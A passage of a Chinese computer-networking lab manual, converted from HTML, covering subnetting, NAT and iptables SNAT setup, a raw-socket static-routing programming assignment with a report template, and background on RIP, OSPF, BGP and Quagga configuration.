子网的划分，实际上就是设计子网掩码的过程。子网掩码主要是用来区分 <span class="s14">IP </span>地址中的网络 <span class="s14">ID </span>和主机 <span class="s14">ID</span>，它用来屏蔽 <span class="s14">IP </span>地址的一部分，从 <span class="s14">IP </span>地址中分离出网络 <span class="s14">ID </span>和主机 <span class="s14">ID</span>。最初 <span class="s14">IP </span>地址空间被分为 <span class="s14">A </span>类，<span class="s14">B </span>类，<span class="s14">C </span>类三个分类网络，<span class="s14">IP </span>地址的分配把 <span class="s14">IP </span>地址的 <span class="s14">32 </span>位按每 <span class="s14">8 </span>位为一段分开。这使得前缀必须为 <span class="s14">8</span>，<span class="s14">16 </span>或者 <span class="s14">24 </span>位。因此，可分配的最小的地址块有 <span class="s14">256</span>（<span class="s14">24 </span>位前缀，<span class="s14">8 </span>位主机地址，<span class="s14">28=256</span>）个地址，而这对大多数企业来说太少了。大一点的地址块包含 <span class="s14">65536</span>（<span class="s14">16 </span>位前缀，<span class="s14">16 </span>位主机，<span class="s14">216=65536</span>）个地址，而这对大公司来说都太多了。这导致不能充分使用 <span class="s14">IP </span>地址和在路由上的不便，因为大量的需要单独路由的小型

网络（<span class="s14">C </span>类网络）因在地域上分得很开而很难进行聚合路由，于是给路由设备增加了很多负担。为了解决这个问题，而引入了无类别域间路由<span class="s14">(CIDR)</span>也即可变长子网掩码<span class="s14">(VLSM)</span>。

例如 <span class="s14">IP </span>地址段：<span class="s14">192.168.0.1-192.168.0.254</span>，其中 <span class="s14">192.168.0 </span>这个属于网络号码，而 <span class="s14">1</span>～

254 <span class="s13">表示这个网段中最大能容纳 </span>254 <span class="s13">台主机。</span>192.168.0.1-192.168.0.254 <span class="s13">默认使用的子网掩码</span>

为 <span class="s14">255.255.255.0</span>，其中的 <span class="s14">0 </span>在 <span class="s14">2 </span>进制中表示为 <span class="s14">8 </span>个 <span class="s14">0</span>。因此有 <span class="s14">8 </span>个位置没有被网络号码给占

用，<span class="s14">2 </span>的 <span class="s14">8 </span>次方就是表示有 <span class="s14">256 </span>个地址，去掉一个头（网络地址）和一个尾（主机地址），

表示有 <span class="s14">254 </span>个主机地址，因此我们想要对这 <span class="s14">254 </span>来划分的话，就是占用最后 <span class="s14">8 </span>个 <span class="s14">0 </span>中的某几位。假如占用第一个<span class="s14">0</span>，那么<span class="s14">2 </span>进制表示的子网掩码为<span class="s14">11111111.11111111.11111111.10000000</span>。转换为 <span class="s14">10 </span>进制就为 <span class="s14">255.255.255.128</span>，些时主机数即为 <span class="s14">2 </span>的 <span class="s14">7 </span>次方<span class="s14">(</span>不再是原来的 <span class="s14">2 </span>的 <span class="s14">8 </span>次方

了），<span class="s14">2 </span>的 <span class="s14">7 </span>次方<span class="s14">=128</span>，因此假如子网掩码为 <span class="s14">255.255.255.128 </span>的话，这个地址段可以被区分

为 <span class="s14">2 </span>个网络， 每个网络中最多有 <span class="s14">128 </span>台主机。 <span class="s14">192.168.0.1-192.168.0.127 </span>为一个，

192.168.0.128-192.168.0.255 <span class="s13">为第二个。关于</span>CDIR <span class="s13">块的匹配如图所示：</span>

<span>![image](计算机网络实验教材2.03(修订)/Image_024.png)</span>

2.  NAT

NAT<span class="s13">（</span>Network Address Translation<span class="s13">）网络地址转换。</span>NAT <span class="s13">的出现是为了解决 </span>IP <span class="s13">日益短缺的问题，使用 </span>NAT <span class="s13">技术可以在多重 </span>Internet <span class="s13">子网中使用相同的 </span>IP,<span class="s13">从而解决了 </span>IP <span class="s13">地址不足的问题，而且还能够有效地避免来自网络外部的攻击，隐藏并保护网络内部的计算机。</span>NAT<span class="s13">的运作机制是自动修改 </span>IP <span class="s13">报文的源 </span>IP <span class="s13">地址和目的 </span>IP <span class="s13">地址，</span>IP <span class="s13">地址校验则在</span>NAT <span class="s13">处理过程中自动完成。</span>NAT <span class="s13">的实现方式有三种，即静态转换 </span>Static Nat<span class="s13">、动态转换 </span>Dynamic Nat <span class="s13">和 端口多路复用</span>OverLoad<span class="s13">。</span>

静态转换是指将内部网络的私有 <span class="s14">IP </span>地址转换为公有 <span class="s14">IP </span>地址，<span class="s14">IP </span>地址对是一对一的，是一成不变的，某个私有 <span class="s14">IP </span>地址只转换为某个公有 <span class="s14">IP </span>地址。借助于静态转换，可以实现外部网络对内部网络中某些特定设备<span class="s14">(</span>如服务器<span class="s14">)</span>的访问。

动态转换是指将内部网络的私有 <span class="s14">IP </span>地址转换为公用 <span class="s14">IP </span>地址时，<span class="s14">IP </span>地址对是不确定的，而是随机的，所有被授权访问上 <span class="s14">Internet </span>的私有 <span class="s14">IP </span>地址可随机转换为任何指定的合法 <span class="s14">IP </span>地址。也就是说，只要指定哪些内部地址可以进行转换，以及用哪些合法地址作为外部地址时，就可以进行动态转换。动态转换可以使用多个合法外部地址集。当 <span class="s14">ISP </span>提供的合法 <span class="s14">IP </span>地址略少于网络内部的计算机数量时。可以采用动态转换的方式。

端口多路复用<span class="s14">(Port address Translation,PAT)</span>是指改变外出数据包的源端口并进行端口转换，即端口地址转换<span class="s14">.</span>采用端口多路复用方式。内部网络的所有主机均可共享一个合法外部

IP <span class="s13">地址实现对 </span>Internet <span class="s13">的访问，从而可以最大限度地节约 </span>IP <span class="s13">地址资源。同时，又可隐藏网络内部的所有主机，有效避免来自 </span>Internet <span class="s13">的攻击。因此，目前网络中应用最多的就是端口多路复用方式。</span>

3.  iptables

iptables <span class="s13">是建立在 </span>netfilter <span class="s13">架构基础上的一个包过滤管理工具，最主要的作用是用来做防火墙或透明代理。</span>iptables <span class="s13">从 </span>ipchains <span class="s13">发展而来，它的功能更为强大。</span>iptables <span class="s13">提供以下三种功能：包过滤、</span>NAT<span class="s13">（网络地址转换）和通用的 </span>pre-route packet mangling<span class="s13">。包过滤：用来过滤包，但是不修改包的内容。</span>iptables <span class="s13">在包过滤方面相对于 </span>ipchians <span class="s13">的主要优点是速度更快，使用更方便。</span>NAT<span class="s13">：</span>NAT <span class="s13">可以分为源地址 </span>NAT <span class="s13">和目的地址 </span>NAT<span class="s13">。</span>

iptables <span class="s13">通过 </span>iptables <span class="s13">命令设置规则，并将其添加到内核空间的过滤表内的链中。</span>iptables<span class="s13">命令的语法规则如下：</span>

iptables [-t table] command [match] [target]

系统根据链中的规则进行过滤。<span class="s14">iptables </span>包含三个表，<span class="s14">filter </span>管理本机进出、<span class="s14">nat </span>管理后端主机、

mangle <span class="s13">管理特殊标志使用。此外还可以自订额外的链。实验中将用到的是表</span>nat<span class="s13">，用作进行来源与目的的替换。其中链 </span>PREROUTING <span class="s13">中为进行路由判断之前所要进行的规则；链</span>

POSTROUTING <span class="s13">中为进行路由判断之后所要进行的规则；链 </span>OUTPUT <span class="s13">中为与发送出去的数据包相关的规则。</span>

NAT <span class="s13">工作的原理是修改 </span>IP<span class="s13">，对于一次通讯中 </span>IP <span class="s13">转换的完整过程通过两条链完成，</span>

POSTROUTING <span class="s13">链修改来源 </span>IP<span class="s13">（</span>SNAT<span class="s13">），</span>PREROUTING <span class="s13">链修改目的 </span>IP<span class="s13">（</span>DNAT<span class="s13">）。内部主机访问外部网络时，</span>SNAT <span class="s13">起作用，替换掉</span>PDU <span class="s13">中不合法的内部源 </span>IP <span class="s13">地址，外部响应到达</span>

时，<span class="s14">DNAT </span>起作用，替换 <span class="s14">PDU </span>中的目的 <span class="s14">IP </span>地址为内网 <span class="s14">IP,</span>再由路由转发给内部主机。不过

iptables <span class="s13">运行时维护有一个表记录了数据包中 </span>IP <span class="s13">的转换，实际中只用使用 </span>POSTROUTING

链即可。

### <a name="bookmark18">实验目标</a>

本实验的主要目的是让学生能熟练地按照需求配置一个静态的包含多个子网的网络环境，并学会<span class="s14">NAT </span>的组网方式，为以后的实验的过程中对组网的要求的打下基础。

### <a name="bookmark19">部署，操作</a><span class="s26">/</span>设计步骤（虚拟机器的配置和拓扑）

1.  虚拟网络配置

    1.  按照提示安装<span class="s14">/</span>拷贝多个虚拟机

        2.  根据拓扑图连接网络拓扑图如下：

    <span>![image](计算机网络实验教材2.03(修订)/Image_025.jpg)</span>
2.  设置 <span class="s22">IP </span>与路由规则

令 <span class="s14">router0 </span>的网段为 <span class="s14">192.168.2.0/24</span>，假设 <span class="s14">swich0 </span>连接有 <span class="s14">80 </span>台主机，<span class="s14">swich2 </span>连接有 <span class="s14">20</span>台主机。请按要求自行划分子网，并为各主机设置 <span class="s14">IP</span>，然后根据 <span class="s14">IP </span>添加路由规则。所用到的命令同前一个实验。设置完成后用 <span class="s14">ping </span>命令检测是否联通。

3.  用 <span class="s22">iptables </span>进行网络地址转换

在模拟 <span class="s14">router0 </span>的虚拟机上使用 <span class="s14">iptables </span>进行网络地址转换。实验中采用静态<span class="s14">NAT</span>。 假设 <span class="s14">router0 </span>具有外部 <span class="s14">IP</span>：<span class="s14">210.28.130.166 </span>并用 <span class="s14">eth0 </span>与<span class="s14">router1 </span>连接，然后 <span class="s14">router0 </span>通过 <span class="s14">iptables</span>

进行映射，需要添加链 <span class="s29">POSTROUTING</span>。使用如下命令设置：

sudo iptables -t nat -A POSTROUTING -o eth0 -s 192.168.2.0/24 -j SNAT --to 210.28.130.166

实验要求完成出网地址映射操作后，在 <span class="s14">PC0 </span>上分别<span class="s14">ping PC1</span>，<span class="s14">PC2</span>，<span class="s14">PC3</span>，用 <span class="s14">wireshark</span>

抓包，记录抓取的<span class="s14">PDU</span>，并作简单分析。

### <a name="bookmark20">注意事项</a>

1<span class="s13">、为保证有效的完成实验，可以先在手册中为各个节点分配好 </span>ip <span class="s13">地址和子网掩码，然后再上机实现；</span>

2<span class="s13">、建议 </span>VMware <span class="s13">中启动的虚拟机的名称与手册中的各对应节点的名称相同；</span>

3<span class="s13">、连接网络过程中，优先配置两台</span>router <span class="s13">的地址，要注意</span>router <span class="s13">上有多个网卡，各个网卡对应不同的 </span>VMnet<span class="s13">，不要出错，可以先不在 </span>router <span class="s13">上填写路由表，但要确认有默认路由表，设置 </span>ip_forward <span class="s13">的值为 </span>1<span class="s13">（见实验一）；</span>

4<span class="s13">、配置 </span>PC<span class="s13">，注意 </span>PC0<span class="s13">，</span>PC1<span class="s13">，</span>PC3 <span class="s13">的子网掩码为 </span>25 <span class="s13">位，并注意填写 </span>PC <span class="s13">默认网关；</span>

5<span class="s13">、完成以上步骤后，图的左部分可以相互通信。右部分可以相互通信，但是图的左半边和右半边不能通信；</span>

<span class="s41">6</span>、在 <span class="s41">router0  </span>添加路由规则，使得所有目的节点的网络地址为 <span class="s41">PC2  </span>所在的网络地址的包通过<span class="s41">router1 </span>的某一端转发，但注意所选取的这一端一定是与<span class="s41">router0 </span>处在同一网段上（如下图<span class="s41">router0 </span>上添加的这条命令为 <span class="s42">sudo ip route add 192.168.2.0/24 via 192.168.1.2</span>），如果前几步都对，则<span class="s41">router0 ping PC2 </span>成功；

<span>![image](计算机网络实验教材2.03(修订)/Image_026.jpg)</span>

## <a name="bookmark21">实验四 静态路由编程实现</a>

### <a name="bookmark22">实验任务</a>

<span>![image](计算机网络实验教材2.03(修订)/Image_027.jpg)</span>

1.  按照上图的网络拓扑，搭建网络，注意，所有 <span class="s14">PC </span>和路由器不要设置 <span class="s14">IP </span>地址。

2.  在<span class="s14">PC1 </span>和<span class="s14">PC2 </span>上建立自己的<span class="s14">ARP </span>表和 <span class="s14">IP </span>表，用 <span class="s14">Raw Socket </span>实现收发<span class="s14">ICMP </span>包的程序。

3.  在 <span class="s14">Router1 </span>和<span class="s14">Router2 </span>上建立自己的<span class="s14">ARP </span>表、<span class="s14">IP </span>表和路由表，用 <span class="s14">Raw Socket </span>实现 <span class="s14">IP </span>包的静态路由转发程序。

4.  在每个<span class="s14">PC </span>和 <span class="s14">router </span>上运行 <span class="s14">ifconfig</span>，确保 <span class="s14">IP </span>地址为空，截屏。

5.  用第 <span class="s14">2 </span>步的收发包程序，从<span class="s14">PC1 ping PC2</span>，把运行结果以及 <span class="s14">Wireshark </span>的抓包结果进行截屏和分析。

提交材料：实验报告<span class="s14">+</span>程序源代码

### <a name="bookmark23">实验报告</a>

由于本次实验着重程序的设计，试验报告中将不要求统一的配置性细节，大家可以自行设置实验环境。 

实验者需提交源代码以及实验报告。提交文件布局如下： 

<span>![image](计算机网络实验教材2.03(修订)/Image_028.jpg)</span>

其中 <span class="s32">source.c </span>为 <span class="s32">C </span>的源文件，<span class="s32">configuration.file </span>为相关配置文件。建议同学可以在

source.c <span class="s6">中的重要代码或者函数入口处添加注释，不做定性要求。 </span>

实验报告最好提交成 <span class="s32">word </span>文档或 pdf 文档，格式应该包含下表内容，同学可以根据内容进行修改，但是各个项目不可省略。说明是为了更详细的解释各个项目，提交的实验报告中无需包含。 

<table style="border-collapse:collapse;margin-left:7.154pt" cellspacing="0"><tr style="height:21pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

实验目的 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:163pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

数据结构说明 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：此处需要解释各自的源代码中的数据结构，以及其用途。示例： 

      <span class="s34">struct xiaomaolv{ int id;</span>

floag weight; int age;

};

该结构是一个描述 <span class="s34">xiaomaolv </span>的结构，对应于现实生活农场中养的毛驴，其中 <span class="s34">id </span>是其在农场中的编号，<span class="s34">weight,age </span>分别代表了该毛驴的质量和年龄。 
</td></tr><tr style="height:43pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

配置文件说明（非必须） 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：此处需要给出配置文件的格式以及读取方式，如程序中没有用到配置文件，则该项可省略 
</td></tr><tr style="height:208pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

程序设计的思路以及运行流程 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：此处需要给出程序的运行流程或者思路。请给出如下两种格式之一：

1.  流程图

2.  流程说明示例：

    1.  程序开始

        2.  读取配置

        3.  检测数据

1.  处理数据

    1.  正确 <span class="s34">goto 3</span>

        2.  错误 <span class="s34">goto 5</span>

5.<span class="s33">程序结束</span>
</td></tr><tr style="height:26pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

运行结果截图 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：请给出你的运行结果截图 
</td></tr><tr style="height:21pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

相关参考资料 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：请给出你完成该实验的参考书目或者网页 
</td></tr><tr style="height:21pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

对比样例程序 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：请给出你参考样例程序的部分，假如没有参考点，填无 
</td></tr><tr style="height:33pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

代码个人创新以及

思考 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：请给出你认为你的源代码中的亮点，比如，针对某个细

节的处理或者算法的优化 
</td></tr><tr style="height:32pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

该程序的应用场景

创新（非必须） 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：请思考一下，该类程序除了在背景中的应用之外，是否

还有其他可能的应用场景。 
</td></tr></table>

### <a name="bookmark24">背景知识</a>

路由 

路由是一种把信息从源穿过网络传递到目的地的行为，在路上，至少遇到一个中间节点。完成路由工作的核心是路由器，路由器是工作在第三层上的设备。路由器一般都包含路由和交换功能，在这里，仅仅讨论路由功能。 

路由整体上是由两个部分构成的，路径选择和数据交换。其中路径选择主要是基于路由算法来确定的，不同的路由算法可能会得出不同的路径选择方式。至于数据交换，仅仅是在 2 层上的数据传输，这个交换的前提是按照之前确定的算法进行的。 

静态路由 

在众多的路由算法分类之中，有一种是静态路由和动态路由的划分。所谓静态路由，就是在网路工作前，由网络管理员事先配置好的网络表映射来确定包的路由方式。而动 态路由是一种可以随着网络改变而动态改变路由表的方式。这里要求实现一个静态路由，所以不深入讨论动态路由的实现。 

系统实现 

在操作系统中，是自动拥有路由表的。 

在 <span class="s32">shell </span>下输入<span class="s32">route </span>命令，可以查看当前的路由表信息： 

<span>![image](计算机网络实验教材2.03(修订)/Image_029.jpg)</span>

图 <span class="s44">1</span>

在这张路由表中，<span class="s32">Destination</span>,<span class="s32">Gateway</span>,<span class="s32">Genmask</span>,<span class="s32">Iface </span>分别对应于目的网络，网关，子网掩码，对应的网络接口。 

通过 <span class="s32">ARP </span>命令查看系统的 <span class="s32">ARP </span>缓存： 

<span>![image](计算机网络实验教材2.03(修订)/Image_030.jpg)</span>

图 <span class="s44">2</span>

Address<span class="s6">，</span>HWtype<span class="s6">,</span>HWaddress<span class="s6">,</span>Iface <span class="s6">分别对应于 </span>IP <span class="s6">地址，硬件类型，硬件地址，网络接口。 </span>

在一个真正的系统当中，对于一个包的路由过程可以看成如下：首先，一个包要发往一个地址，那么根据该地址在路由表中进行查询，找到对应的网关，然后将包转发到网关上，而转发到网关的过程中，会用到 <span class="s32">ARP </span>缓存来确定以太帧的<span class="s32">MAC </span>头信息。此时，我们需要动态的更新查找 <span class="s32">ARP </span>缓存来填充头部信息。然后发送。 

### <a name="bookmark25">实验目标</a>

本实验主要目的设计和实现一个简单的静态路由机制，用以取代 <span class="s32">Linux </span>实现的静态路由方式，进而加深对二三层协议衔接及静态路由的理解。 

### <a name="bookmark26">部署，操作</a><span class="s26">/</span>设计步骤

数据结构以及流程实现 

回顾在背景知识中介绍的路由过程以及系统实现中的数据结构，我们确定了我们自己的简单路由协议至少要具备如下数据结构： 

//the information of the static routing table <span style=" color: #000;">struct route_item{</span>

char destination[16]; char gateway[16]; char netmask[16]; char interface[16];

}route_info[MAX_ROUTE_INFO];

// the sum of the items in the route table <span style=" color: #000;">int route_item_index=0;</span>

一个简单的静态路由表，该表是符合于静态路由协议的，那么也就是说路由路径的选择是通过该静态路由表来确定的，而且该路由表除了手动修改之外在程序运行过程之中不会改变。 

//the informaiton of the &quot; my arp cache&quot; <span style=" color: #000;">struct arp_table_item{</span>

char ip_addr[16]; char mac_addr[18];

}arp_table[MAX_ARP_SIZE];

// the sum of the items in the arp cache <span style=" color: #000;">int arp_item_index =0;</span>

一个可以动态改变的 <span class="s32">ARP </span>缓存 

该 <span class="s32">ARP </span>缓存可以在运行的过程中动态的添加删除 <span class="s32">arp </span>表项。除此之外，为了方便，还增加了一个模仿系统网络配置的数据结构。 

// the storage of the device , got information from configuration file : if.info <span style=" color: #000;">struct device_item{</span>

char interface[14]; char mac_addr[18];

}device[MAX_DEVICE];

// the sum of the interface

int device_index=0;

定义完数据结构之后，我们应该定义一下这个静态路由程序的工作流程，我们需要回顾一下，一个路由器的工作方式。 

路由器可以看作是一个重复工作的<span class="s7">循环</span>机器，当它启动的时候，管理员会设置它的

启动选项，并对它的路由表，路由策略进行选择，他自己也要初始化自己的一些其他类似于操作系统的信息，它监听设备上的许多硬件接口，查看着每一个它收到的包，当一个数据包符合它路由表的条件的时候，它就会根据路由表的信息对其进行转发，在转发的过程由于是通过其他的接口的转发，必然要用到 <span class="s32">arp </span>缓存中的数据项，当一个数据包符合在网络上准确传输的时候，它就会将这个经过它重重修改的包发送到对应的接口上去，这个数据包未来的发展就与它无关了，它所要做的就是继续监听，并重复之前做过的事情。 

根据一个路由器的工作流程，我们也可以模仿出我们静态路由程序的工作流程。 

<span>![image](计算机网络实验教材2.03(修订)/Image_031.png)</span>

路由程序初始状态

读取配置文件并初始化路由程序中的数据结构

监听所有的网口

捕获到一个来自于本地网口的数据包

解析包头并判断 <span class="s46">否</span>

是否转发

是

更改包头并转发到响应的接口

图 <span class="s44">5</span>

其中监听网口和我们可以看作是创建一个<span class="s32">socket</span>，并 <span class="s32">recvfrom </span>在这个端口之上，假如收到包的话，就算是捕获到一个来自本地网口的数据包。 

## <a name="bookmark27">实验五 动态路由协议 </a><span class="s12">RIP</span>，<span class="s12">OSPF </span>和 <span class="s12">BGP </span>观察

### <a name="bookmark28">背景知识</a>

1.  自治系统

自治系统（<span class="s14">AS</span>，<span class="s14">Autonomous  System</span>），是一个处于一个或多个管理机构控制之下的路由器和网络群组。一个自治系统中的所有路由器必须相互连接，运行相同的路由协议，所使用的路由协议由系统自主决定，因此有时也被称为是一个路由选择域（<span class="s14">routing domain</span>）。自治系统自主决定用于进行网络内部路由信息通信的协议称为内部网关协议（<span class="s14">IGP</span>，<span class="s14">Interior Gateway Protocols</span>），而各个自治系统网络之间则是通过边界网关协议（<span class="s14">BGP</span>，<span class="s14">Border Gateway</span>

Protocol<span class="s13">）来共享路由信息。每个自治系统都会被分配一个全局的唯一的号码，自治系统号</span>

（<span class="s14">ASN</span>）。这个号码用于标识出一个自治系统，以支持 <span class="s14">BGP</span>。

2.  内部网关协议

内部网关协议（<span class="s14">IGP</span>）是一种专用于一个自治系统中网关间交换数据流转通道信息的协议。网络 <span class="s14">IP </span>协议或者其他的网络协议常常通过这些通道信息来决断怎样传送数据流。目前的内部网关协议有<span class="s14">RIP</span>、<span class="s14">OSPF</span>、<span class="s14">IGRP</span>、<span class="s14">EIGRP</span>、<span class="s14">IS-IS </span>等协议。其中最常用的两种内部网关协议分别是：路由信息协议（<span class="s14">RIP</span>）和最短路径优先路由协议（<span class="s14">OSPF</span>）。

    1.  路由信息协议

    路由信息协议（<span class="s14">RIP</span>，<span class="s14">Routing Information Protocol</span>）是应用较早、使用较普遍的内部网关协议，它采用距离向量算法，适用于小型网络。在默认情况下，<span class="s14">RIP </span>使用跳跃计数<span class="s14">(hop count)</span>作为来衡量路由距离，跳跃计数是一个包到达目标所必须经过的路由器的数目。如果到相同目标有二个不等速或不同带宽的路由器，但跳跃计数相同，则 <span class="s14">RIP  </span>认为两个路由是等距离的。跳跃计数取值为 <span class="s14">1~15</span>，数值 <span class="s14">16 </span>表示无穷大。<span class="s14">RIP </span>使用 <span class="s14">UDP </span>的 <span class="s14">520 </span>端口来发送和接收

    RIP <span class="s13">报文。</span>RIP <span class="s13">报文每隔 </span>30s <span class="s13">以广播的形式发送一次，为了防止出现</span>“<span class="s13">广播风暴</span>”<span class="s13">，其后续的的报文将做随机延时后发送。在 </span>RIP <span class="s13">中，如果一个路由在 </span>180s <span class="s13">内未被刷新，则相应的距离就被设定成无穷大，并从路由表中删除该表项。</span>RIP <span class="s13">报文分为两种：请求报文和响应报文。</span>

        2.  开放式最短路径优先

    开放式最短路径优先（<span class="s14">OSPF</span>，<span class="s14">Open Shortest Path First</span>）是另一种被广泛使用的内部网关协议。<span class="s14">OSPF </span>根据域中的链路状态来决策路由，计算出最短路径树，通常多用于较大型的网络。<span class="s14">OSPF </span>协议同时使用单播（<span class="s14">unicast</span>）和多播（<span class="s14">multicast</span>）来发送<span class="s14">Hello </span>包和连接状态更新（<span class="s14">link  state  updates</span>），使用的多播地址为 <span class="s14">224.0.0.5 </span>和 <span class="s14">224.0.0.6</span>。不同于<span class="s14">RIP </span>的是，<span class="s14">OSPF</span>协议直接使用 <span class="s14">IP </span>协议，并将链路状态广播数据包传送给在某一区域内的所有路由器，而不是将部分或全部的路由表传递给与其相邻的路由器。
3.  边际网关协议

边界网关协议（<span class="s14">BGP</span>，<span class="s14">Border Gateway Protocol</span>）是互联网的核心路由协议。它通过维护路由表来实现自治系统之间的可达性，属于向量路由协议。<span class="s14">BGP </span>不使用传统域内路由协议的距离度量，而是基于路径、网络策略和规则集来决定路由。<span class="s14">BGP </span>通过在路由器上手工设置来使用 <span class="s14">TCP </span>的 <span class="s14">179 </span>号端口来发送和接收报文。<span class="s14">BGP </span>路由器会周期地发送 <span class="s14">19 </span>字节的保持

存活报文来维护连接（默认周期为 <span class="s14">60 </span>秒）。当 <span class="s14">BGP </span>在一个自治系统内部运行时，它被称作内部边界网关协议（<span class="s14">iBGP</span>，<span class="s14">Interior Border Gateway Protocol</span>）；当 <span class="s14">BGP </span>在 <span class="s14">AS </span>之间运行时，它被称作外部边界网关协议（<span class="s14">eBGP</span>，<span class="s14">Exterior Border Gateway Protocol</span>）。

4.  Quagga

Quagga <span class="s13">是一个提供了基于</span>TCP/IP <span class="s13">协议的路由服务的软件包。</span>Quagga <span class="s13">工作在</span>Uinx <span class="s13">平台上，是 </span>GNU Zebra <span class="s13">的分支之一。除可提供静态路由服务外，</span>Quagga <span class="s13">还支持 </span>RIPv1<span class="s13">，</span>RIPv2<span class="s13">， </span>RIPng<span class="s13">，</span>OSPFv3<span class="s13">，</span>BGP-4<span class="s13">，</span>BGP-4+<span class="s13">等动态路由协议。</span>Quagga <span class="s13">由多个守护进程组成，结构如图所示：</span>

<span>![image](计算机网络实验教材2.03(修订)/Image_032.jpg)</span>

其中核心的是<span class="s14">zebra</span>，它可以读取和更新内核路由表，为其它守护进程提供操作 <span class="s14">Unix </span>和<span class="s14">TCP</span>数据流的 <span class="s14">API</span>。<span class="s14">Ospfd </span>实现了 <span class="s14">OSPFv2 </span>协议；<span class="s14">ripd </span>实现了 <span class="s14">RIPv1 </span>和 <span class="s14">RIPv2 </span>协议；<span class="s14">ospf6d </span>实现了 <span class="s14">OSPFv3 </span>协议；<span class="s14">ripngd </span>实现了 <span class="s14">RIPng </span>协议；<span class="s14">bgpd </span>实现了 <span class="s14">BGPv4 </span>和 <span class="s14">BGPv4+</span>协议。

### <a name="bookmark29">实验目标</a>

理解自治系统（<span class="s14">AS</span>），观察 <span class="s14">RIP</span>，<span class="s14">OSPF </span>以及 <span class="s14">BGP </span>动态路由协议的实际运行过程。在网络拓扑结构变更的情况下观察路由表的动态变更，通过实验理解路由选择算法。

### <a name="bookmark30">实验任务</a>

1.  RIP <span class="s23">协议观察</span>

    1.  按照提示安装<span class="s14">/</span>拷贝多个虚拟机

        2.  根据拓扑图连接一个简单链状网络拓扑图如下：

    <span>![image](计算机网络实验教材2.03(修订)/Image_033.jpg)</span>

    注意：请为 <span class="s14">router0 </span>预留一个网口，为 <span class="s14">router3 </span>预留两个网口

        3.  给每个连接在网络上的网卡设置 <span class="s14">ip</span>

    使用 <span class="s14">ifconfig </span>命令进行设置，或通过 <span class="s14">zebra.conf </span>文件进行设置（见 <span class="s14">1.4</span>）

        4.  运行<span class="s14">RIP </span>协议

            1.  在<span class="s14">/etc/quagga/</span>目录下添加两个配制文件 <span class="s14">zebra.conf </span>和 <span class="s14">ripd.conf</span>。

                    1.  本次实验中我们只需进行简单的配制，若已通过 <span class="s14">ifconfig </span>命令为网卡设置过 <span class="s14">ip</span>，则可以直接使用 <span class="s14">quagga </span>的配置示例，复制示例中的配制文件，使用命令如下：

            sudo cp /usr/share/doc/quagga-core/examples/zebra.conf.sample /etc/quagga/zebra.conf

                        2.  若未使用 <span class="s14">ifconfig </span>命令。可通过使用 <span class="s14">zebra.conf </span>文件设置，内容如下：

            !-*-zebra-*- hostname router password zebra

        enable password zebra log stdout

        !

        interface _network_

        description Interface to External Network ip address _a.b.c.d/m_

        !

        interface _network_

        description Interface to Internal Network ip address _a.b.c.d/m_

        !

        <p class="s13" style="padding-top: 5pt;padding-left: 6pt;text-indent: 0pt;line-height: 123%;text-align: left;">注意，请根据具体情况选择使用<span class="s14">&quot;External Network&quot;  </span>连接外部网络，<span class="s14">&quot;Internal Network&quot;  </span>连接内部网络；<span class="s14">&quot;ip address </span><span class="s27">a.b.c.d/m</span><span class="s14">&quot;</span>中<span class="s27">a.b.c.d/m </span>表示网络设备的<span class="s14">ip </span>地址和子网掩码，如<span class="s14">10.0.0.1/8</span>。

